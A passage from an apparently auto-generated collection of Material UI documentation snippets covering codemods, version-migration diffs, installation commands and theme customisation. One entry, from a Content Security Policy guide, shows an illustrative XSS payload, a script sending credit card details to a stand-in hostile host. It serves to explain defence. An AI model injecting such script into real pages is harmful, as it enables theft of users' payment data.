repository and setting up the upstream remote for contribution.\nSOURCE: https://github.com/mui/material-ui/blob/master/CONTRIBUTING.md#2025-04-22_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\ngit clone https://github.com/<your username>/material-ui.git\ncd material-ui\ngit remote add upstream https://github.com/mui/material-ui.git\n```\n\n----------------------------------------\n\nTITLE: Configuring TypeScript for styled-components with Material UI\nDESCRIPTION: Shows how to update tsconfig.json to properly resolve the styled-components engine when using TypeScript.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/integrations/styled-components/styled-components.md#2025-04-22_snippet_2\n\nLANGUAGE: diff\nCODE:\n```\n```diff title=\"tsconfig.json\"\n {\n   \"compilerOptions\": {\n+    \"paths\": {\n+      \"@mui/styled-engine\": [\"./node_modules/@mui/styled-engine-sc\"]\n+    }\n   },\n }\n```\n```\n\n----------------------------------------\n\nTITLE: InputLabel Size Update Codemod (v7.0.0)\nDESCRIPTION: Updates the InputLabel's size prop value from 'normal' to 'medium'\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_64\n\nLANGUAGE: bash\nCODE:\n```\nnpx @mui/codemod v7.0.0/input-label-size-normal-medium <path>\n```\n\nLANGUAGE: diff\nCODE:\n```\n-<InputLabel size=\"normal\">Label</InputLabel>\n+<InputLabel size=\"medium\">Label</InputLabel>\n```\n\n----------------------------------------\n\nTITLE: Adding Inter Font using Google Web Fonts CDN\nDESCRIPTION: HTML code for including the Inter font from Google Fonts CDN by adding links in the document head.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/getting-started/installation/installation.md#2025-04-22_snippet_4\n\nLANGUAGE: html\nCODE:\n```\n<link rel=\"preconnect\" href=\"https://fonts.googleapis.com\" />\n<link rel=\"preconnect\" href=\"https://fonts.gstatic.com\" crossorigin />\n<link\n  rel=\"stylesheet\"\n  href=\"https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap\"\n/>\n```\n\n----------------------------------------\n\nTITLE: Updating Theme Spacing Usage\nDESCRIPTION: Diff showing the migration from theme.spacing.unit to the new theme.spacing() function API.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v3/migration-v3.md#2025-04-22_snippet_9\n\nLANGUAGE: diff\nCODE:\n```\n label: {\n   [theme.breakpoints.up('sm')]: {\n-    paddingTop: theme.spacing.unit * 12,\n+    paddingTop: theme.spacing(12),\n   },\n }\n```\n\n----------------------------------------\n\nTITLE: Correct CSS Specificity for MUI Components\nDESCRIPTION: CSS example showing how to properly target Material UI components by increasing specificity with parent selectors. This approach is necessary when using external CSS files with MUI components.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/migration-v4.md#2025-04-22_snippet_12\n\nLANGUAGE: css\nCODE:\n```\n.MuiChip-root .green {\n  color: green;\n}\n```\n\n----------------------------------------\n\nTITLE: Updating CircularProgress Variant\nDESCRIPTION: Renames 'static' variant to 'determinate' in CircularProgress component.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/v5-component-changes.md#2025-04-22_snippet_10\n\nLANGUAGE: diff\nCODE:\n```\n-<CircularProgress variant=\"static\" classes={{ static: 'className' }} />\n+<CircularProgress variant=\"determinate\" classes={{ determinate: 'className' }} />\n```\n\n----------------------------------------\n\nTITLE: Typography TypeScript Module Augmentation\nDESCRIPTION: TypeScript type definitions for custom typography scale values.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/typography/typography.md#2025-04-22_snippet_3\n\nLANGUAGE: ts\nCODE:\n```\ndeclare module '@mui/joy/styles' {\n  interface TypographySystemOverrides {\n    subtitle: true;\n    label: true;\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Importing Badge Component for Use with Avatars\nDESCRIPTION: Import statement for the Badge component, which can be combined with Avatar to show status indicators.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/avatar/avatar.md#2025-04-22_snippet_2\n\nLANGUAGE: jsx\nCODE:\n```\nimport Badge from '@mui/joy/Badge';\n```\n\n----------------------------------------\n\nTITLE: Importing Adapter for date-fns v2.x - React JavaScript\nDESCRIPTION: This code snippet demonstrates how to import the AdapterDateFns for integrating MUI X Date Pickers with date-fns version 2.x. Requires installation of '@mui/x-date-pickers' and peer dependency 'date-fns@^2'. The import enables date pickers to interpret and format dates using date-fns v2 APIs. No parameters are required; simply import and use the adapter as the 'dateAdapter' prop in date picker components. Limitations: Only compatible with v2.x of date-fns.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/mui-x-v7-beta.md#2025-04-22_snippet_2\n\nLANGUAGE: JSX\nCODE:\n```\n// date-fns v2.x\nimport { AdapterDateFns } from '@mui/x-date-pickers/AdapterDateFns';\n```\n\n----------------------------------------\n\nTITLE: Restoring Old MUI JoyIconButton Default Props using extendTheme in JavaScript\nDESCRIPTION: Provides a theme customization snippet using `extendTheme` to set the default props for the `JoyIconButton` component back to their older values. It sets the default `variant` to 'soft' and the default `color` to 'primary'.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/migration/migrating-default-theme.md#2025-04-22_snippet_18\n\nLANGUAGE: javascript\nCODE:\n```\nextendTheme({\n  components: {\n    JoyIconButton: {\n      defaultProps: {\n        variant: 'soft',\n        color: 'primary',\n      },\n    },\n  },\n});\n```\n\n----------------------------------------\n\nTITLE: Running Link Underline Hover Codemod Command\nDESCRIPTION: Command to execute the link-underline-hover codemod on a specified path. This adds the underline=\"hover\" property to Link components that don't define the underline prop.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_92\n\nLANGUAGE: bash\nCODE:\n```\nnpx @mui/codemod@latest v5.0.0/link-underline-hover <path>\n```\n\n----------------------------------------\n\nTITLE: Installing Material Icons with Yarn\nDESCRIPTION: Command to install Material Icons and Material UI packages using Yarn, with required dependency workaround using resolutions.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/integrations/icon-libraries/icon-libraries.md#2025-04-22_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\nyarn add @mui/icons-material @mui/material\n```\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"dependencies\": {\n    \"@mui/material\": \"npm:@mui/joy@latest\"\n  },\n  \"resolutions\": {\n    \"@mui/material\": \"npm:@mui/joy@latest\"\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Importing Material-UI Components with Top-Level Imports in JavaScript\nDESCRIPTION: This snippet demonstrates how to import Material-UI components using top-level imports, which helps in minimizing bundle size. The example shows importing Button and TextField components.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/july-2019-update.md#2025-04-22_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\nimport { Button, TextField } from '@mui/material';\n```\n\n----------------------------------------\n\nTITLE: Adding Start Icon to Material-UI Button (JSX)\nDESCRIPTION: Demonstrates how to prepend an icon to a Material-UI Button component using the `startIcon` prop introduced in a recent update. This requires importing the desired icon component (e.g., `DeleteIcon` from `@mui/icons-material`) and passing it as a React element to the `startIcon` prop.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/september-2019-update.md#2025-04-22_snippet_0\n\nLANGUAGE: jsx\nCODE:\n```\nimport DeleteIcon from '@mui/icons-material/Delete';\n\n<Button startIcon={<DeleteIcon />}>Delete</Button>;\n```\n\n----------------------------------------\n\nTITLE: Updating Grid Size Props for Single Value\nDESCRIPTION: Shows how to convert a uniform breakpoint prop to the simplified size prop in Material UI v6/v7.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/upgrade-to-grid-v2/upgrade-to-grid-v2.md#2025-04-22_snippet_5\n\nLANGUAGE: diff\nCODE:\n```\n-<Grid xs={6}>\n+<Grid size={6}>\n```\n\n----------------------------------------\n\nTITLE: Modal Props Codemod Example\nDESCRIPTION: This codemod removes the deprecated disableBackdropClick and onEscapeKeyDown props from Modal components to match API changes in Material-UI v5.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_97\n\nLANGUAGE: diff\nCODE:\n```\n <Modal\n-  disableBackdropClick\n-  onEscapeKeyDown={handleEscapeKeyDown}\n />\n```\n\n----------------------------------------\n\nTITLE: Illustrating XSS Attack Vector in HTML\nDESCRIPTION: Example of a malicious script that could be injected via XSS attack, demonstrating why CSP is important for security.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/guides/content-security-policy/content-security-policy.md#2025-04-22_snippet_0\n\nLANGUAGE: html\nCODE:\n```\n<script>\n  sendCreditCardDetails('https://hostile.example');\n</script>\n```\n\n----------------------------------------\n\nTITLE: Creating Left-Positioned Timeline in React\nDESCRIPTION: Shows how to position the main content of the timeline on the left side relative to the time axis.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/timeline/timeline.md#2025-04-22_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\n{\"demo\": \"LeftPositionedTimeline.js\"}\n```\n\n----------------------------------------\n\nTITLE: Installing Material Icons Package\nDESCRIPTION: Commands to install Material Icons package using different package managers.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/getting-started/installation/installation.md#2025-04-22_snippet_6\n\nLANGUAGE: bash\nCODE:\n```\nnpm install @mui/icons-material\n```\n\nLANGUAGE: bash\nCODE:\n```\npnpm add @mui/icons-material\n```\n\nLANGUAGE: bash\nCODE:\n```\nyarn add @mui/icons-material\n```\n\n----------------------------------------\n\nTITLE: Configuring Vite for MUI System v7 Modern Bundle (JavaScript)\nDESCRIPTION: This JavaScript snippet demonstrates configuring Vite for the MUI System v7 modern bundle. Adding `'mui-modern'` to the `resolve.conditions` array instructs Vite to use the optimized bundle, excluding legacy browser code for reduced size. Ensure it's placed appropriately within the existing conditions.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/migration/upgrade-to-v7/upgrade-to-v7.md#2025-04-22_snippet_2\n\nLANGUAGE: javascript\nCODE:\n```\n// vite.config.js\n{\n  resolve: {\n    conditions: ['mui-modern', 'module', 'browser', 'development|production']\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: SX Prop Migration Codemod (v6.0.0)\nDESCRIPTION: Updates the sx prop usage to be compatible with @pigment-css/react, transforming theme-dependent styles.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_65\n\nLANGUAGE: bash\nCODE:\n```\nnpx @mui/codemod@latest v6.0.0/sx-prop <path>\n```\n\nLANGUAGE: diff\nCODE:\n```\n <Box\n-  sx={{\n-    backgroundColor: (theme) =>\n-      theme.palette.mode === 'light' ? theme.palette.grey[100] : theme.palette.grey[900],\n-  }}\n+  sx={theme => ({\n+    backgroundColor: theme.palette.grey[900],\n+    ...theme.applyStyles(\"light\", {\n+      backgroundColor: theme.palette.grey[100]\n+    })\n+  })}\n />\n```\n\n----------------------------------------\n\nTITLE: Importing RSC-Compatible Layout Components with Pigment CSS in JSX\nDESCRIPTION: This snippet shows how to import Material UI v6 layout components (Grid, Container, Stack) that are compatible with React Server Components (RSC). These specific imports from '@mui/material-pigment-css' are required when using the experimental Pigment CSS integration for RSC environments.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/material-ui-v6-is-out.md#2025-04-22_snippet_10\n\nLANGUAGE: jsx\nCODE:\n```\nimport Grid from '@mui/material-pigment-css/Grid';\nimport Container from '@mui/material-pigment-css/Container';\nimport Stack from '@mui/material-pigment-css/Stack';\n```\n\n----------------------------------------\n\nTITLE: Updating ImageListItemBar CSS Classes\nDESCRIPTION: CSS selector transformations for the ImageListItemBar component, replacing old nested class selectors with proper parent-child relationship selectors for position and action components.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_43\n\nLANGUAGE: diff\nCODE:\n```\n- .MuiImageListItemBar-titleWrapBelow\n+.MuiImageListItemBar-positionBelow > .MuiImageListItemBar-titleWrap\n```\n\n----------------------------------------\n\nTITLE: Updating Firevent for Ripple Effect in React Tests\nDESCRIPTION: Updates to testing code to handle the improved ripple effect in Material UI v6, wrapping fireEvent calls in act and using async/await to avoid React warnings.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/upgrade-to-v6/upgrade-to-v6.md#2025-04-22_snippet_20\n\nLANGUAGE: diff\nCODE:\n```\n- fireEvent.click(button);\n+ await act(async () => fireEvent.mouseDown(button));\n```\n\n----------------------------------------\n\nTITLE: Removing Button Span Wrapper\nDESCRIPTION: Removes span element that wraps button children and the label classKey.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/v5-component-changes.md#2025-04-22_snippet_6\n\nLANGUAGE: diff\nCODE:\n```\n <button class=\"MuiButton-root\">\n-  <span class=\"MuiButton-label\">\n     children\n-  </span>\n </button>\n```\n\n----------------------------------------\n\nTITLE: Renaming components and componentsProps to slots and slotProps in Joy UI\nDESCRIPTION: This codemod renames the 'components' and 'componentsProps' props to 'slots' and 'slotProps' respectively in Joy UI components. It updates the prop names to match the new API.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_68\n\nLANGUAGE: diff\nCODE:\n```\n <Autocomplete\n-  components={{ listbox: CustomListbox }}\n-  componentsProps={{ root: { className: 'root' }, listbox: { 'data-testid': 'listbox' } }}\n+  slots={{ listbox: CustomListbox }}\n+  slotProps={{ root: { className: 'root' }, listbox: { 'data-testid': 'listbox' } }}\n />;\n```\n\n----------------------------------------\n\nTITLE: Renaming TextField CSS classes in React\nDESCRIPTION: Renames marginDense and inputMarginDense classes to sizeSmall and inputSizeSmall to match the prop in TextField component.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/v5-component-changes.md#2025-04-22_snippet_40\n\nLANGUAGE: diff\nCODE:\n```\n-<Input margin=\"dense\" />\n+<Input size=\"small\" />\n```\n\n----------------------------------------\n\nTITLE: Restoring Old MUI JoyAlert Default Props using extendTheme in JavaScript\nDESCRIPTION: Provides a theme customization snippet using `extendTheme` to set the default props for the `JoyAlert` component back to their previous values. Specifically, it changes the default `variant` to 'soft' and the default `color` to 'primary'.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/migration/migrating-default-theme.md#2025-04-22_snippet_14\n\nLANGUAGE: javascript\nCODE:\n```\nextendTheme({\n  components: {\n    JoyAlert: {\n      defaultProps: {\n        variant: 'soft',\n        color: 'primary',\n      },\n    },\n  },\n});\n```\n\n----------------------------------------\n\nTITLE: Fixing DOM Node Issues with Transition Components - Ref Forwarding Example\nDESCRIPTION: Shows incorrect and correct implementations of custom components when used with Material UI transition components. Custom components must forward the ref to a DOM element.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/troubleshooting.md#2025-04-22_snippet_4\n\nLANGUAGE: jsx\nCODE:\n```\n// Ex. 2-1 ❌ This will cause an error because `CustomComponent` does not forward `ref` to the DOM:\nfunction CustomComponent() {\n  return <div>...</div>;\n}\n\n<Fade in>\n  <CustomComponent />\n</Fade>;\n```\n\nLANGUAGE: jsx\nCODE:\n```\n// Ex. 2-2 ✅ Add `React.forwardRef` to forward `ref` to the DOM:\nconst CustomComponent = React.forwardRef(function CustomComponent(props, ref) {\n  return (\n    <div ref={ref}>\n      ...\n    </div>\n  )\n})\n\n<Fade in>\n  <CustomComponent />\n</Fade>\n```\n\n----------------------------------------\n\nTITLE: Downloading Material UI Next.js Example\nDESCRIPTION: Commands to download and extract the Material UI Next.js example project from the main repository.\nSOURCE: https://github.com/mui/material-ui/blob/master/examples/material-ui-nextjs/README.md#2025-04-22_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\ncurl https://codeload.github.com/mui/material-ui/tar.gz/master | tar -xz --strip=2  material-ui-master/examples/material-ui-nextjs\ncd material-ui-nextjs\n```\n\n----------------------------------------\n\nTITLE: Updating Grid Size Props for Auto-Growing\nDESCRIPTION: Shows how to convert the auto-growing 'true' value for breakpoint props to the new 'grow' value in Material UI v6/v7.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/upgrade-to-grid-v2/upgrade-to-grid-v2.md#2025-04-22_snippet_6\n\nLANGUAGE: diff\nCODE:\n```\n-<Grid xs>\n+<Grid size=\"grow\">\n```\n\n----------------------------------------\n\nTITLE: Updating Slider Classes in MUI\nDESCRIPTION: Changes to Slider component class names for size and color variants, updating both JS and CSS implementations\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_60\n\nLANGUAGE: diff\nCODE:\n```\nimport { sliderClasses } from '@mui/material/Slider';\n\nMuiSlider: {\n  styleOverrides: {\n    root: {\n-      [`& .${sliderClasses.thumbSizeSmall}`]: {\n+      [`&.${sliderClasses.sizeSmall} > .${sliderClasses.thumb}`]: {\n        color: 'red',\n      },\n[...additional class changes...]\n```\n\n----------------------------------------\n\nTITLE: Running the import-path codemod for v1.0.0\nDESCRIPTION: Command to execute the codemod that updates import paths for the new component locations in Material UI v1.0.0.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_121\n\nLANGUAGE: bash\nCODE:\n```\nnpx @mui/codemod@latest v1.0.0/import-path <path>\n```\n\n----------------------------------------\n\nTITLE: Importing ModalUnstyled Component from MUI Base\nDESCRIPTION: Shows how to import the unstyled modal component from @mui/base. This provides the functionality of a modal dialog without pre-defined styling.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/2021-q3-update.md#2025-04-22_snippet_2\n\nLANGUAGE: jsx\nCODE:\n```\nimport { ModalUnstyled } from '@mui/base/ModalUnstyled';\n```\n\n----------------------------------------\n\nTITLE: Installing React Dependencies with Package Manager\nDESCRIPTION: Commands for installing specific versions of React and React DOM using different package managers (npm, pnpm, yarn).\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/upgrade-to-v6/upgrade-to-v6.md#2025-04-22_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\nnpm install react@<version> react-dom@<version>\n```\n\nLANGUAGE: bash\nCODE:\n```\npnpm add react@<version> react-dom@<version>\n```\n\nLANGUAGE: bash\nCODE:\n```\nyarn add react@<version> react-dom@<version>\n```\n\n----------------------------------------\n\nTITLE: Updating Checkbox CSS Classes\nDESCRIPTION: Removes IconButton-related class names from Checkbox component.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/v5-component-changes.md#2025-04-22_snippet_9\n\nLANGUAGE: diff\nCODE:\n```\n-<span class=\"MuiIconButton-root MuiButtonBase-root MuiCheckbox-root PrivateSwitchBase-root\">\n-  <span class=\"MuiIconButton-label\">\n-    <input class=\"PrivateSwitchBase-input\">\n+<span class=\"MuiButtonBase-root MuiCheckbox-root PrivateSwitchBase-root\">\n+  <span class=\"PrivateSwitchBase-input\">\n```\n\n----------------------------------------\n\nTITLE: Replacing `css` Prop with `sx` in MUI System JSX\nDESCRIPTION: Shows how to replace the `css` prop with the `sx` prop on MUI System components like `Box`. This change avoids potential collisions with the `css` prop used by libraries like styled-components and Emotion.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/v5-style-changes.md#2025-04-22_snippet_38\n\nLANGUAGE: diff\nCODE:\n```\n-<Box css={{ color: 'primary.main' }} />\n+<Box sx={{ color: 'primary.main' }} />\n```\n\n----------------------------------------\n\nTITLE: Importing Button Component in Joy UI\nDESCRIPTION: Basic import statement for using the Button component from Joy UI.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/button/button.md#2025-04-22_snippet_0\n\nLANGUAGE: jsx\nCODE:\n```\nimport Button from '@mui/joy/Button';\n```\n\n----------------------------------------\n\nTITLE: Configuring Tailwind CSS Layer Order\nDESCRIPTION: CSS configuration for setting up the layer order in Tailwind CSS to ensure proper style application with Material UI.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/integrations/tailwindcss/tailwindcss-v4.md#2025-04-22_snippet_1\n\nLANGUAGE: css\nCODE:\n```\n@layer theme, base, mui, components, utilities;\n@import 'tailwindcss';\n```\n\n----------------------------------------\n\nTITLE: Customizing Column Count in Grid Components with React\nDESCRIPTION: Demonstrates how to customize the number of columns in a Grid container by using the columns prop, changing from the default 12 columns to a custom value.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/mui-core-v5.md#2025-04-22_snippet_9\n\nLANGUAGE: jsx\nCODE:\n```\n<Grid container columns={16}>\n```\n\n----------------------------------------\n\nTITLE: ListItemText Props Codemod Command\nDESCRIPTION: Bash command to automatically transform deprecated ListItemText component props using MUI's codemod utility.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_41\n\nLANGUAGE: bash\nCODE:\n```\nnpx @mui/codemod@latest deprecations/list-item-text-props <path>\n```\n\n----------------------------------------\n\nTITLE: Migrating Tree View Imports in JavaScript\nDESCRIPTION: This snippet demonstrates how to update import statements when migrating from @mui/lab to @mui/x-tree-view for the TreeView and TreeItem components.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/lab-tree-view-to-mui-x.md#2025-04-22_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\n-import TreeView from '@mui/lab/TreeView';\n-import TreeItem from '@mui/lab/TreeItem';\n+import { TreeView } from '@mui/x-tree-view/TreeView';\n+import { TreeItem } from '@mui/x-tree-view/TreeItem';\n```\n\nLANGUAGE: javascript\nCODE:\n```\n-import { TreeView, TreeItem } from '@mui/lab';\n+import { TreeView, TreeItem } from '@mui/x-tree-view';\n```\n\n----------------------------------------\n\nTITLE: Migrating Box API Import Statement in Material-UI (diff)\nDESCRIPTION: This diff code snippet demonstrates how to update the import statement for the Box component in Material-UI. The migration removes the unstable_Box import and uses the stable Box API from '@material-ui/core/Box'. No additional dependencies are required aside from Material-UI v4. The key change is replacing the unstable import path with the direct Box import, which improves code stability and alignment with the API's finalized status.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/march-2019-update.md#2025-04-22_snippet_0\n\nLANGUAGE: diff\nCODE:\n```\n-import { unstable_Box as Box } from '@material-ui/core/Box';\\n+import Box from '@material-ui/core/Box';\n```\n\n----------------------------------------\n\nTITLE: CSS Grid Layout Implementation\nDESCRIPTION: Example demonstrating how to use MUI System and CSS Grid Layout as an alternative to the Grid component's internal flexbox implementation.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/grid/grid.md#2025-04-22_snippet_12\n\nLANGUAGE: jsx\nCODE:\n```\n{\"demo\": \"CSSGrid.js\", \"bg\": true}\n```\n\n----------------------------------------\n\nTITLE: Updating FilledInput Theme Default Props\nDESCRIPTION: Updates MuiFilledInput theme configuration to use the new slots/slotProps API instead of components/componentsProps.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_31\n\nLANGUAGE: diff\nCODE:\n```\n MuiFilledInput: {\n   defaultProps: {\n-    components: { Input: CustomInput, Root: CustomRoot }\n-    componentsProps: { input: { id: 'test-input-id' }, root: { id: 'test-root-id' } }\n+    slots: { input: CustomInput, root: CustomRoot },\n+    slotProps: { input: { id: 'test-input-id' }, root: { id: 'test-root-id' } },\n   },\n },\n```\n\n----------------------------------------\n\nTITLE: Implementing Custom Escape Key Handling for Chip Component\nDESCRIPTION: Custom implementation to maintain the v5 behavior of Chip losing focus on Escape key press, which changed in v6 where Chip retains focus like other button components.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/upgrade-to-v6/upgrade-to-v6.md#2025-04-22_snippet_2\n\nLANGUAGE: js\nCODE:\n```\nimport * as React from 'react';\nimport Chip from '@mui/material/Chip';\n\nexport default function ChipExample() {\n  const chipRef = React.useRef(null);\n  const keyUpHandler = (event) => {\n    if (event.key === 'Escape' && chipRef.current) {\n      chipRef.current.blur();\n    }\n  };\n  return (\n    <Chip\n      label=\"Chip Outlined\"\n      variant=\"outlined\"\n      ref={chipRef}\n      onKeyUp={keyUpHandler}\n    />\n  );\n}\n```\n\n----------------------------------------\n\nTITLE: Applying Container Queries using the sx Prop (JSX & CSS)\nDESCRIPTION: This snippet shows how to apply container queries directly using the `sx` prop in JSX. It uses shorthand syntax like `'@sm'` (referencing theme breakpoints) and `'@400/sidebar'` (specifying width and container name) to conditionally set `flexDirection`. The simplified CSS output illustrates the resulting `@container` rules.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/material-ui-v6-is-out.md#2025-04-22_snippet_7\n\nLANGUAGE: jsx JSX\nCODE:\n```\n<Card\n  sx={{\n    '@sm': {\n      flexDirection: 'row',\n    },\n    '@400/sidebar': {\n      flexDirection: 'row',\n    },\n  }}\n/>\n```\n\nLANGUAGE: css CSS\nCODE:\n```\n/* Simplified CSS Output */\n\n.MuiCard-root-dn383 {\n  @container (min-width: 600px) {\n    flex-direction: row;\n  }\n  @container sidebar (min-width: 400px) {\n    flex-direction: row;\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Adding Roboto Font via Google Web Fonts CDN\nDESCRIPTION: HTML code to include Roboto font from Google Web Fonts CDN in your project.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/getting-started/installation/installation.md#2025-04-22_snippet_5\n\nLANGUAGE: html\nCODE:\n```\n<link rel=\"preconnect\" href=\"https://fonts.googleapis.com\" />\n<link rel=\"preconnect\" href=\"https://fonts.gstatic.com\" crossorigin />\n<link\n  rel=\"stylesheet\"\n  href=\"https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap\"\n/>\n```\n\n----------------------------------------\n\nTITLE: Installing Material UI Core v4 with npm or yarn\nDESCRIPTION: Command line instructions for installing Material UI core version 4 using either npm or yarn package managers.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v3/migration-v3.md#2025-04-22_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\nnpm install @material-ui/core\n\nor\n\nyarn add @material-ui/core\n```\n\n----------------------------------------\n\nTITLE: Running the color-imports codemod with custom paths\nDESCRIPTION: Command with additional options to specify custom import and target paths for the color-imports codemod.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_125\n\nLANGUAGE: bash\nCODE:\n```\nnpx @mui/codemod@latest v1.0.0/color-imports <path> -- --importPath='mui/styles/colors' --targetPath='mui/colors'\n```\n\n----------------------------------------\n\nTITLE: Updating Stepper padding in React\nDESCRIPTION: Adds inline padding style to Stepper component to maintain the previously built-in 24px padding that was removed in v5.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/v5-component-changes.md#2025-04-22_snippet_24\n\nLANGUAGE: diff\nCODE:\n```\n-<Stepper>\n+<Stepper style={{ padding: 24 }}>\n    <Step>\n      <StepLabel>Hello world</StepLabel>\n    </Step>\n  </Stepper>\n```\n\n----------------------------------------\n\nTITLE: Embedding Media Content in Markdown - HTML in Markdown\nDESCRIPTION: This snippet demonstrates how to embed a video file inside a Markdown document using raw HTML tags. It utilizes the <video> HTML element with attributes such as autoplay, muted, loop, playsinline, and sets the width and height. A <source> tag identifies the video file, while its type is specified for browser compatibility. This method requires the Markdown renderer to support raw HTML blocks, and works best for local or server-hosted media. Be aware of file accessibility and browser support for the video format.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/2020-q1-update.md#2025-04-22_snippet_0\n\nLANGUAGE: html\nCODE:\n```\n<video autoplay muted loop playsinline width=\"382\" height=\"408\">\n  <source src=\"/static/blog/2020-q1-update/autocomplete.mp4\" type=\"video/mp4\" />\n</video>\n```\n\n----------------------------------------\n\nTITLE: Migrating from StepButtonIcon Type\nDESCRIPTION: Shows how to update code that uses the deprecated StepButtonIcon type to use StepButtonProps['icon'] instead.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/upgrade-to-v7/upgrade-to-v7.md#2025-04-22_snippet_22\n\nLANGUAGE: diff\nCODE:\n```\n-import { StepButtonIcon } from '@mui/material/StepButton';\n+import { StepButtonProps } from '@mui/material/StepButton';\n\n-StepButtonIcon\n+StepButtonProps['icon']\n```\n\n----------------------------------------\n\nTITLE: Adding New Demo Component Path\nDESCRIPTION: Example path structure for adding new component demos to the documentation.\nSOURCE: https://github.com/mui/material-ui/blob/master/CONTRIBUTING.md#2025-04-22_snippet_7\n\nLANGUAGE: bash\nCODE:\n```\ndocs/src/pages/components/buttons/\n```\n\n----------------------------------------\n\nTITLE: Handling Dialog Backdrop Clicks with onClose Callback\nDESCRIPTION: Demonstrates how to handle backdrop clicks in Dialog components using the onClose callback, which replaces the deprecated onBackdropClick prop.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/upgrade-to-v7/upgrade-to-v7.md#2025-04-22_snippet_16\n\nLANGUAGE: jsx\nCODE:\n```\nfunction Example() {\n  const [open, setOpen] = React.useState(false);\n\n  const handleClose = (event, reason) => {\n    if (reason === 'backdropClick') {\n      // Handle the backdrop click\n    }\n    setOpen(false);\n  };\n\n  return (\n    <Dialog open={open} onClose={handleClose}>\n      {/* Dialog content */}\n    </Dialog>\n  );\n}\n```\n\n----------------------------------------\n\nTITLE: Using injectFirst with StylesProvider in Material UI (React, JSX)\nDESCRIPTION: This React JSX snippet demonstrates wrapping your application tree in the StylesProvider component with the injectFirst prop. This ensures that custom styles are injected first in the <head>, allowing CSS-in-JS solutions (like styled-components) to safely override Material UI's default styles. To use this pattern, you must install @mui/styles and wrap your root component. The main parameter is injectFirst, which must be set on StylesProvider. The pattern is essential when you want custom CSS specificity to take precedence over Material UI defaults.\nSOURCE: 